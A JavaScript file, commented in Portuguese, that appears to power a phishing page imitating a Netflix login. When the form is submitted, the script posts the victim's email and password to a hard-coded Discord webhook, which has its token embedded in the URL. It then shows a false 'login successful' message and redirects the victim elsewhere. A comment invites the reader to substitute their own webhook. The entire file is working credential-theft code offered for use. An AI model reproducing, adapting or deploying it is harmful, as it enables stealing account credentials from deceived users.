document.addEventListener('DOMContentLoaded', function () {
    const loginForm = document.getElementById('login-form');
    const emailField = document.getElementById('email');
    const passwordField = document.getElementById('password');
    const loginButton = document.getElementById('login-button');
    
    // Função para verificar se os campos estão preenchidos
    function checkFormCompletion() {
        if (emailField.value && passwordField.value) {
            loginButton.disabled = false; // Habilita o botão de login se ambos os campos forem preenchidos
        } else {
            loginButton.disabled = true; // Desabilita o botão de login se qualquer campo estiver vazio
        }
    }

    // Verifica o preenchimento dos campos
    emailField.addEventListener('input', checkFormCompletion);
    passwordField.addEventListener('input', checkFormCompletion);

    // Enviar os dados ao Discord ao clicar no botão
    loginForm.addEventListener('submit', function (event) {
        event.preventDefault(); // Impede o envio tradicional do formulário

        // Verificar se os campos estão preenchidos
        if (!emailField.value || !passwordField.value) {
            alert('Por favor, preencha todos os campos.');
            return; // Impede o envio se algum campo estiver vazio
        }

        // Dados coletados dos campos
        const email = emailField.value;
        const password = passwordField.value;

        // Enviar os dados para o Discord
        sendToDiscord(email, password);
    });
});

// Função para enviar os dados para o Discord
function sendToDiscord(email, password) {
    const webhookUrl = 'https://discord.com/api/webhooks/1317017089357385770/6Kc7n9lA1kk_A6mGrgaCrtmWk0ZmAP24L5xfJVzHrgIyxvcR7CdwHsc_NieKvAnBgKtP'; // Substitua pela sua URL do webhook

    const payload = {
        content: `𝙇𝙊𝙂𝙄𝙉 𝙉𝙀𝙏𝙁𝙇𝙄𝙓 🔴 :\n\n𝐄𝐦𝐚𝐢𝐥 𝐨𝐮 𝐧𝐮́𝐦𝐞𝐫𝐨 : ${email}\n𝐒𝐞𝐧𝐡𝐚: ${password}`
    };

    fetch(webhookUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify(payload),
    })
    .then(response => {
        if (response.ok) {
            console.log('Dados enviados com sucesso para o Discord!');
            alert('Login realizado com sucesso!');
            // Redireciona para a página concluido2.html após o envio dos dados
            window.location.href = 'concluido2.html';
        } else {
            console.error('Erro ao enviar os dados para o Discord.');
            alert('Erro ao enviar os dados. Tente novamente.');
        }
    })
    .catch(error => {
        console.error('Erro:', error);
        alert('Erro de conexão. Tente novamente.');
    });
}